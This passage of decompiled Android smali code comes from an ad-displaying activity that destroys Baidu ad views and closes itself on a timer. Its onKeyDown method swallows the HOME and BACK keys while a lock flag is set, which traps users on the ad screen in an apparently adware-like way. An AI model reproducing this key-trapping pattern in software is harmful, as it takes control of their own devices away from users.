    iget-object v3, p0, Lcom/attached/Tmac;->mHandler:Landroid/os/Handler;

    if-eqz v3, :cond_0

    .line 177
    iget-object v3, p0, Lcom/attached/Tmac;->mHandler:Landroid/os/Handler;

    invoke-virtual {v3, p0}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    .line 179
    :cond_0
    iget-object v3, p0, Lcom/attached/Tmac;->mDubao:Lcom/baidu/mobads/DubaoAd;

    if-eqz v3, :cond_1

    .line 180
    iget-object v3, p0, Lcom/attached/Tmac;->mDubao:Lcom/baidu/mobads/DubaoAd;

    invoke-virtual {v3}, Lcom/baidu/mobads/DubaoAd;->destroy()V

    .line 181
    const/4 v3, 0x0

    iput-object v3, p0, Lcom/attached/Tmac;->mDubao:Lcom/baidu/mobads/DubaoAd;

    .line 183
    :cond_1
    const/4 v3, 0x0

    iput-boolean v3, p0, Lcom/attached/Tmac;->isAddedCount:Z

    .line 184
    iget-object v3, p0, Lcom/attached/Tmac;->julyAdvLayout:Landroid/widget/LinearLayout;

    if-eqz v3, :cond_2

    iget-object v3, p0, Lcom/attached/Tmac;->julyAdvLayout:Landroid/widget/LinearLayout;

    invoke-virtual {v3}, Landroid/widget/LinearLayout;->getChildCount()I

    move-result v3

    if-eqz v3, :cond_2

    .line 185
    const/4 v2, 0x0

    .local v2, "i":I
    :goto_0
    iget-object v3, p0, Lcom/attached/Tmac;->julyAdvLayout:Landroid/widget/LinearLayout;

    invoke-virtual {v3}, Landroid/widget/LinearLayout;->getChildCount()I

    move-result v3

    if-lt v2, v3, :cond_3

    .line 191
    iget-object v3, p0, Lcom/attached/Tmac;->julyAdvLayout:Landroid/widget/LinearLayout;

    invoke-virtual {v3}, Landroid/widget/LinearLayout;->removeAllViews()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 196
    .end local v2    # "i":I
    :cond_2
    :goto_1
    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    .line 197
    return-void

    .line 186
    .restart local v2    # "i":I
    :cond_3
    :try_start_1
    iget-object v3, p0, Lcom/attached/Tmac;->julyAdvLayout:Landroid/widget/LinearLayout;

    invoke-virtual {v3, v2}, Landroid/widget/LinearLayout;->getChildAt(I)Landroid/view/View;

    move-result-object v0

    .line 187
    .local v0, "child":Landroid/view/View;
    instance-of v3, v0, Lcom/baidu/mobads/AdView;

    if-eqz v3, :cond_4

    .line 188
    check-cast v0, Lcom/baidu/mobads/AdView;

    .end local v0    # "child":Landroid/view/View;
    invoke-virtual {v0}, Lcom/baidu/mobads/AdView;->destroy()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    .line 185
    :cond_4
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    .line 193
    .end local v2    # "i":I
    :catch_0
    move-exception v1

    .line 194
    .local v1, "e":Ljava/lang/Exception;
    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_1
.end method

.method public onKeyDown(ILandroid/view/KeyEvent;)Z
    .locals 4
    .param p1, "keyCode"    # I
    .param p2, "event"    # Landroid/view/KeyEvent;

    .prologue
    const/4 v0, 0x1

    .line 242
    sget-boolean v1, Lcom/sgoogle/Tools;->DEBUG:Z

    if-eqz v1, :cond_0

    .line 243
    const-string v1, "JULY"

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "lock==="

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-boolean v3, p0, Lcom/attached/Tmac;->lock:Z

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Lcom/sgoogle/TLog;->e(Ljava/lang/String;Ljava/lang/String;)V

    .line 245
    :cond_0
    const/4 v1, 0x3

    if-ne p1, v1, :cond_2

    invoke-virtual {p2}, Landroid/view/KeyEvent;->getRepeatCount()I

    move-result v1

    if-nez v1, :cond_2

    .line 246
    iget-boolean v1, p0, Lcom/attached/Tmac;->lock:Z

    if-eqz v1, :cond_4

    .line 247
    sget-boolean v1, Lcom/sgoogle/Tools;->DEBUG:Z

    if-eqz v1, :cond_1

    .line 248
    const-string v1, "JULY"

    const-string v2, "KEYCODE_HOME="

    invoke-static {v1, v2}, Lcom/sgoogle/TLog;->e(Ljava/lang/String;Ljava/lang/String;)V

    .line 266
    :cond_1
    :goto_0
    return v0

    .line 252
    :cond_2
    const/4 v1, 0x4

    if-ne p1, v1, :cond_4

    .line 253
    invoke-virtual {p2}, Landroid/view/KeyEvent;->getRepeatCount()I

    move-result v1

    if-nez v1, :cond_4

    .line 254
    iget-boolean v1, p0, Lcom/attached/Tmac;->lock:Z

    if-eqz v1, :cond_3

    .line 255
    sget-boolean v1, Lcom/sgoogle/Tools;->DEBUG:Z

    if-eqz v1, :cond_1

    .line 256
    const-string v1, "JULY"

    const-string v2, "KEYCODE_BACK="

    invoke-static {v1, v2}, Lcom/sgoogle/TLog;->e(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0

    .line 259
    :cond_3
    iget-boolean v1, p0, Lcom/attached/Tmac;->buLiang:Z

    if-eqz v1, :cond_4

    .line 260
    sget-boolean v1, Lcom/sgoogle/Tools;->DEBUG:Z

    if-eqz v1, :cond_1

    .line 261
    const-string v1, "JULY"

    const-string v2, "buLiang_KEYCODE_BACK="

    invoke-static {v1, v2}, Lcom/sgoogle/TLog;->e(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0

    .line 266
    :cond_4
    invoke-super {p0, p1, p2}, Landroid/app/Activity;->onKeyDown(ILandroid/view/KeyEvent;)Z

    move-result v0

    goto :goto_0
.end method

.method protected onPause()V
    .locals 0

    .prologue
    .line 230
    invoke-super {p0}, Landroid/app/Activity;->onPause()V

    .line 232
    return-void
.end method

.method protected onResume()V
    .locals 0

    .prologue
    .line 236
    invoke-super {p0}, Landroid/app/Activity;->onResume()V

    .line 238
    return-void
.end method

.method public run()V
    .locals 2

    .prologue
    .line 399
    invoke-virtual {p0}, Lcom/attached/Tmac;->isFinishing()Z

    move-result v0

    if-nez v0, :cond_2

    .line 400
    sget-boolean v0, Lcom/sgoogle/Tools;->DEBUG:Z

    if-eqz v0, :cond_0

    .line 401
    const-string v0, "JULY"

    const-string v1, "\u65f6\u95f4\u5230,\u6211\u8981\u81ea\u6740\u4e86.........................."

    invoke-static {v0, v1}, Lcom/sgoogle/TLog;->w(Ljava/lang/String;Ljava/lang/String;)V

    .line 403
    :cond_0
    invoke-virtual {p0}, Lcom/attached/Tmac;->finish()V

    .line 409
    :cond_1
    :goto_0
    return-void

    .line 405
    :cond_2
    sget-boolean v0, Lcom/sgoogle/Tools;->DEBUG:Z

    if-eqz v0, :cond_1

    .line 406
    const-string v0, "JULY"

    const-string v1, "\u6211\u5df2\u7ecf\u6302\u6389\u4e86.........................."

    invoke-static {v0, v1}, Lcom/sgoogle/TLog;->w(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0
.end method
